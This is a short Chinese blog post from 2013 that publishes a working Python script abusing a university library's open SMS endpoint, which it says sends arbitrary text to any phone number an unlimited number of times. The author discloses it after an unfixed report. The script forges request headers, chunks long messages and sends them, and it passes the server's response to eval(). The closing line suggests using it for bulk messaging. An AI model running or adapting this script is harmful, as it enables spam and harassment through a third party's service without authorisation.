title:又能喝茶了
date:2013-03-15-18-21
---
图书馆不是可以发送图书位置的短信到手机么。。问题就出在这里，随便向任意号码发送任意内容任意次。我已经反映问题了。但仍未修复。果断开源..

<pre>
import requests
import time
import random

def sendsms(phone,msg):
    s=requests.session()

    headers={'Accept':'*/*',
    'Accept-Charset':'GBK,utf-8;q=0.7,*;q=0.3',
    'Accept-Encoding':'gzip,deflate,sdch',
    'Accept-Language':'zh-CN,zh;q=0.8',
    'Cache-Control':'no-cache',
    'Connection':'keep-alive',
    'Host':'202.116.13.7',
    'Pragma':'no-cache',
    'Referer':'http://202.116.13.244/search~S1*chx?/ca5/ca5/1%2C254%2C254%2CE/frameset&FF=ca56+53+20121&1%2C1%2C/indexsort=r',
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.56 Safari/537.17',
    }

    json=s.get("http://202.116.13.7/ssms/servlet/SendSMS?jsoncallback=call&mobile=%s&msg=%s" %(phone,msg),headers=headers).text
    
    def call(msg):
       assert msg['msg']==u"短信发送成功。".encode('utf-8')
    eval(json)



def sendsmsex(phone,msg):
  print msg[:70]
  sendsms(phone,msg[:70])
  time.sleep(4)
  if len(msg)<=70:
     return
  else:
     sendsmsex(phone,msg[70:])




phone="1562512xxxx"
text=u"""
请先做自我介绍。
谈谈以往最深刻的活动经历，遇到何种问题，如何解决？
进入大学，计划在大学期间学到什么？
为何选择网络部，期望从网络部中获得什么？
对网络部了解吗？对所应聘的部门工作有何种看法？
请简单介绍一下自己的性格？
课程安排是怎样的？
如何看待社团活动？
明天下午6:00准时到校友楼四楼招新面试，马斌、文锐组织好，吉琼、鹏振协助，我下班之后回去和你们一起，需要穿正装。明天的面试分两步：你们第一轮筛选，如果觉得合适，请他们等一段时间，我回来之后我再和他们谈谈。大家不要有太大压力，看看他们和你们合得来不，合得来就一切都可以谈。
 """

sendsmsex(phone,text)
</pre>


学校不管的话学生组织能不能利用他群发SMS呢。。
